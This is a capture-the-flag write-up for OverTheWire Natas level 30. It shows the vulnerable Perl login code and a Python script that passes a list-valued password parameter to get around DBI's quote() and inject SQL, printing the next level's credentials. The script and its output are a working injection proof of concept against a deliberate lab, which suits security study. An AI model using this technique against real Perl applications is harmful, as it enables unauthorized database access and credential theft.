# Level 30

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas30.natas.labs.overthewire.org](http://natas30.natas.labs.overthewire.org)
- username: `natas30`
- password: `Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X`

## Solution

![start](./start.jpg)

Let's see the source code:

```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

So looks pretty simple. By googling we can find, that [quote()](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872) is vulnerable due to misuse:

![vuln](./vuln.jpg)

Let's write python script to implement it:

```py
import requests

# Base URL
url = 'http://natas30.natas.labs.overthewire.org/index.pl'

# Function to make POST request
def send_request():

    # Our parameters
    params = dict(username="natas31", password=['"any" or 1', 4])
    
    headers = {
        'Authorization': 'Basic bmF0YXMzMDpHejRhdDhDZE9ZUWtrSjhmSmFtYzExSmc1aE9uWE05WA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas30.natas.labs.overthewire.org',
        'Referer': 'http://natas30.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request
    response = requests.post(url, headers=headers, data=params)

    return response.text

response = send_request()
print(response)
```

Output:

```
...
here is your result:natas31AMZF14yknOn9Uc57uKB02jnYuhplYka3
...
``` 

## Password

`natas31`:`AMZF14yknOn9Uc57uKB02jnYuhplYka3`

*Created by [bu19akov](https://github.com/bu19akov)*